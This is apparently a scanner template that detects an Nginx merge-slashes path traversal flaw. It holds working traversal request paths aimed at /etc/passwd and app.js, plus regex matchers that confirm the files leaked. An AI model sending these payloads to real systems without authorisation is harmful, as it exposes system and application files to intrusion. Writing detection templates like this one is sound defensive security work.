id: nginx-merge-slashes-path-traversal
info:
  author: dhiyaneshDk
  description: A vulnerability in the remote Nginx server could cause the server to
    merge slashslash together causing what should have protected the web site from
    a directory traversal vulnerability into a vulnerable server.
  name: Nginx Merge Slashes Path Traversal
  reference:
  - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
  - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
  severity: medium
  tags: exposure,config,lfi,nginx
requests:
- matchers:
  - condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - app.listen
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}///////../../../etc/passwd'
  - '{{BaseURL}}/static///////../../../../etc/passwd'
  - '{{BaseURL}}///../app.js'
  stop-at-first-match: true
